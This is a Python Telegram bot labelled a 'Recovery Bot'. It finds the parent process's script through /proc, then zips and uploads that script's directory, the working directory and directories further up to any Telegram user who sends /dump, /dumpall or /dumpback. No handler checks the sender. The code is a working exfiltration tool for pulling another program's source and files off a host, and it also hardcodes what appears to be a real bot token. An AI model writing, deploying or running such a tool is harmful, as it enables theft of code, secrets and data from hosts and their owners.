import os
import zipfile
import io
import logging
from telegram import Update
from telegram.error import BadRequest
from telegram.ext import Application, CommandHandler, ContextTypes

# ---------- CONFIG ----------
TOKEN = "8867142715:AAEIfJIDUVWvebZ7sYJu6KPOAEiOE1w8YKc"          # Replace with your new token
MAX_ZIP_SIZE = 35 * 1024 * 1024        # 35 MB per part (safe margin)
MAX_DEPTH = 3                           # Maximum depth to traverse
SKIP_DIRS = {                           # System directories to skip
    '/dev', '/proc', '/sys', '/run', '/tmp',
    '/mnt', '/media', '/root', '/lost+found',
    '/boot', '/etc', '/var', '/usr'
}
# -----------------------------

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_parent_script_dir():
    try:
        ppid = os.getppid()
        with open(f"/proc/{ppid}/cmdline", "rb") as f:
            cmdline = f.read().split(b'\0')
        for arg in cmdline:
            if arg.endswith(b'.py'):
                script_path = arg.decode('utf-8')
                script_dir = os.path.dirname(script_path)
                if os.path.isdir(script_dir):
                    return script_dir, script_path
        return None, None
    except Exception as e:
        logger.warning(f"Parent detection failed: {e}")
        return None, None

def get_back_path(current_path, steps):
    if steps < 0:
        return None, "Steps must be a positive integer."
    path = current_path
    actual_steps = 0
    for _ in range(steps):
        parent = os.path.dirname(path)
        if parent == path:
            break
        if parent in SKIP_DIRS or any(parent.startswith(d + '/') for d in SKIP_DIRS):
            break
        path = parent
        actual_steps += 1
    if actual_steps == 0:
        return None, "Cannot go up; already at root or system directory boundary."
    if actual_steps < steps:
        return path, f"Went up {actual_steps} level(s) (requested {steps}); stopped before system directory."
    return path, None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Recovery Bot Commands:\n"
        "/dump               → hosting bot's code\n"
        "/dumpall            → current directory (recursive)\n"
        "/dumpback [N]       → go up N directories (default 1) and dump all\n"
        "/listback [N]       → go up N directories (default 1) and list files\n"
        "/list               → file tree of current directory\n"
        "/status             → show current working directory and parent info\n"
        "/help               → show this message"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cwd = os.getcwd()
    parent = os.path.dirname(cwd)
    msg = f"📂 Current directory: `{cwd}`\n⬆️ Parent: `{parent}`"
    script_dir, script_path = get_parent_script_dir()
    if script_dir:
        msg += f"\n🤖 Host bot detected at: `{script_path}`"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def dump(update: Update, context: ContextTypes.DEFAULT_TYPE):
    script_dir, script_path = get_parent_script_dir()
    if script_dir:
        target = script_dir
        msg = f"✅ Host bot found at: `{script_path}`"
    else:
        target = os.getcwd()
        msg = "⚠️ Could not detect host bot, using current directory."
    await send_large_folder(update, target, zip_name_prefix="host_bot", caption=msg)

async def dumpall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = os.getcwd()
    await send_large_folder(update, target, zip_name_prefix="current_dir")

async def dumpback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    parts = text.split()
    steps = 1
    if len(parts) > 1:
        try:
            steps = int(parts[1])
            if steps < 1:
                await update.message.reply_text("Please provide a positive integer.")
                return
        except ValueError:
            await update.message.reply_text("Invalid number. Usage: /dumpback [N]")
            return
    current = os.getcwd()
    target, msg = get_back_path(current, steps)
    if msg:
        await update.message.reply_text(f"⚠️ {msg}")
    if target is None:
        return
    await update.message.reply_text(f"⬆️ Going back to: `{target}`")
    await send_large_folder(update, target, zip_name_prefix="parent_dir")

async def listback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    parts = text.split()
    steps = 1
    if len(parts) > 1:
        try:
            steps = int(parts[1])
            if steps < 1:
                await update.message.reply_text("Please provide a positive integer.")
                return
        except ValueError:
            await update.message.reply_text("Invalid number. Usage: /listback [N]")
            return
    current = os.getcwd()
    target, msg = get_back_path(current, steps)
    if msg:
        await update.message.reply_text(f"⚠️ {msg}")
    if target is None:
        return
    await update.message.reply_text(f"⬆️ Going back to: `{target}`")
    await send_file_list(update, target)

async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = os.getcwd()
    await send_file_list(update, target)

async def send_file_list(update: Update, target_dir: str):
    try:
        lines = []
        for root, dirs, files in os.walk(target_dir, followlinks=False):
            if root in SKIP_DIRS or any(root.startswith(d + '/') for d in SKIP_DIRS):
                continue
            rel = os.path.relpath(root, target_dir)
            if rel == ".":
                rel = "/"
            lines.append(f"\n📁 {rel}/")
            for f in files:
                fpath = os.path.join(root, f)
                try:
                    if os.path.islink(fpath) and not os.path.exists(fpath):
                        continue
                    size = os.path.getsize(fpath)
                    lines.append(f"  {f}  ({size/1024:.1f} KB)")
                except OSError:
                    lines.append(f"  {f}  (⚠️ unreadable)")
        txt = "\n".join(lines)
        await update.message.reply_document(
            document=io.BytesIO(txt.encode('utf-8')),
            filename="file_list.txt",
            caption="📋 File tree (skips unreadable items)."
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

def collect_files(target_dir, max_depth=None):
    all_files = []
    target_dir = os.path.abspath(target_dir)
    base_depth = target_dir.rstrip('/').count('/')
    for root, dirs, files in os.walk(target_dir, followlinks=False, topdown=True):
        if root in SKIP_DIRS or any(root.startswith(d + '/') for d in SKIP_DIRS):
            dirs.clear()
            continue
        if max_depth is not None:
            current_depth = root.rstrip('/').count('/') - base_depth
            if current_depth > max_depth:
                dirs.clear()
                continue
        for d in list(dirs):
            full = os.path.join(root, d)
            if full in SKIP_DIRS or any(full.startswith(s + '/') for s in SKIP_DIRS):
                dirs.remove(d)
        for file in files:
            fpath = os.path.join(root, file)
            try:
                if os.path.islink(fpath) and not os.path.exists(fpath):
                    continue
                size = os.path.getsize(fpath)
                all_files.append((fpath, size))
            except OSError:
                continue
    return all_files

async def send_zip_buffer(update: Update, zip_buffer: io.BytesIO, filename: str, caption: str, retries: int = 3):
    """Send a zip buffer with retry on 413 (too large)."""
    zip_buffer.seek(0)
    size = zip_buffer.getbuffer().nbytes
    logger.info(f"Sending {filename} ({size/1024/1024:.2f} MB)")
    try:
        await update.message.reply_document(
            document=zip_buffer,
            filename=filename,
            caption=caption
        )
        return True
    except BadRequest as e:
        if "413" in str(e) or "Request Entity Too Large" in str(e):
            logger.warning(f"413 error for {filename} (size {size/1024/1024:.2f} MB)")
            if retries > 0:
                # We can't reduce size, but inform user
                await update.message.reply_text(
                    f"⚠️ Part is still too large ({size/1024/1024:.2f} MB). "
                    "The folder has very large files. Try using a smaller depth or filter files."
                )
                return False
            else:
                await update.message.reply_text(
                    f"❌ Failed to send {filename} after multiple attempts. File too large."
                )
                return False
        else:
            raise

async def send_large_folder(update: Update, target_dir: str, zip_name_prefix: str = "dump", caption: str = None):
    """Collect files, split into multiple zips if needed, with 413 handling."""
    try:
        if target_dir in SKIP_DIRS or any(target_dir.startswith(d + '/') for d in SKIP_DIRS):
            await update.message.reply_text(f"⚠️ Target `{target_dir}` is a system directory. Refusing.")
            return

        status_msg = await update.message.reply_text("📁 Scanning files...")
        all_files = collect_files(target_dir, MAX_DEPTH)
        if not all_files:
            await status_msg.edit_text("No readable files found.")
            return

        total_size = sum(size for _, size in all_files)
        file_count = len(all_files)
        await status_msg.edit_text(f"📦 Found {file_count} files, total size: {total_size/1024/1024:.2f} MB")

        if total_size <= MAX_ZIP_SIZE:
            await status_msg.edit_text("📦 Zipping... (single file)")
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for fpath, _ in all_files:
                    arcname = os.path.relpath(fpath, target_dir)
                    zipf.write(fpath, arcname)
            zip_buffer.seek(0)
            await status_msg.edit_text("📤 Sending...")
            success = await send_zip_buffer(update, zip_buffer, f"{zip_name_prefix}_dump.zip", caption or "All files (single zip)")
            if success:
                await status_msg.delete()
            return

        # Split into parts
        await status_msg.edit_text("📦 Total size exceeds limit, splitting into parts...")

        # Helper to split a list of files into batches respecting MAX_ZIP_SIZE
        def split_batch(batch, limit):
            batches = []
            current = []
            current_size = 0
            for fpath, size in batch:
                if current_size + size > limit:
                    if current:
                        batches.append((current, current_size))
                    current = []
                    current_size = 0
                current.append((fpath, size))
                current_size += size   # ✅ Fixed indentation – now at correct level
            if current:
                batches.append((current, current_size))
            return batches

        # Create initial batches
        batches = split_batch(all_files, MAX_ZIP_SIZE)

        total_parts = len(batches)
        await status_msg.edit_text(f"📦 Creating {total_parts} parts...")

        for idx, (batch, batch_size) in enumerate(batches, 1):
            await status_msg.edit_text(f"📦 Zipping part {idx}/{total_parts} ({batch_size/1024/1024:.2f} MB)...")
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for fpath, _ in batch:
                    arcname = os.path.relpath(fpath, target_dir)
                    zipf.write(fpath, arcname)
            zip_buffer.seek(0)

            # If part size exceeds 48 MB (safety), split further
            actual_size = zip_buffer.getbuffer().nbytes
            if actual_size > 48 * 1024 * 1024:
                await status_msg.edit_text(f"⚠️ Part {idx} is too large ({actual_size/1024/1024:.2f} MB), splitting further...")
                sub_batches = split_batch(batch, MAX_ZIP_SIZE // 2)  # half size
                sub_total = len(sub_batches)
                for sub_idx, (sub_batch, sub_size) in enumerate(sub_batches, 1):
                    sub_zip = io.BytesIO()
                    with zipfile.ZipFile(sub_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for fpath, _ in sub_batch:
                            arcname = os.path.relpath(fpath, target_dir)
                            zipf.write(fpath, arcname)
                    sub_zip.seek(0)
                    await status_msg.edit_text(f"📤 Sending part {idx}.{sub_idx}/{total_parts}.{sub_total}...")
                    success = await send_zip_buffer(
                        update,
                        sub_zip,
                        f"{zip_name_prefix}_part_{idx}_{sub_idx}.zip",
                        f"📦 Part {idx}.{sub_idx}/{total_parts}.{sub_total} ({sub_size/1024/1024:.2f} MB)"
                    )
                    if not success:
                        await status_msg.edit_text(f"❌ Failed to send part {idx}.{sub_idx}. Aborting.")
                        return
                continue  # skip normal send for this part

            await status_msg.edit_text(f"📤 Sending part {idx}/{total_parts}...")
            success = await send_zip_buffer(
                update,
                zip_buffer,
                f"{zip_name_prefix}_part_{idx}.zip",
                f"📦 Part {idx}/{total_parts} ({batch_size/1024/1024:.2f} MB)"
            )
            if not success:
                await status_msg.edit_text(f"❌ Failed to send part {idx}. Aborting.")
                return

        await status_msg.delete()
        await update.message.reply_text("✅ All parts sent successfully.")

    except Exception as e:
        logger.exception("send_large_folder failed")
        await update.message.reply_text(f"❌ Error: {str(e)}")

def main():
    app = Application.builder() \
        .token(TOKEN) \
        .connect_timeout(30.0) \
        .read_timeout(120.0) \
        .write_timeout(120.0) \
        .build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("dump", dump))
    app.add_handler(CommandHandler("dumpall", dumpall))
    app.add_handler(CommandHandler("dumpback", dumpback))
    app.add_handler(CommandHandler("listback", listback))
    app.add_handler(CommandHandler("list", list_files))

    print("🤖 Advanced Recovery Bot running. Commands: /dump, /dumpall, /dumpback [N], /listback [N], /list, /status, /help")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()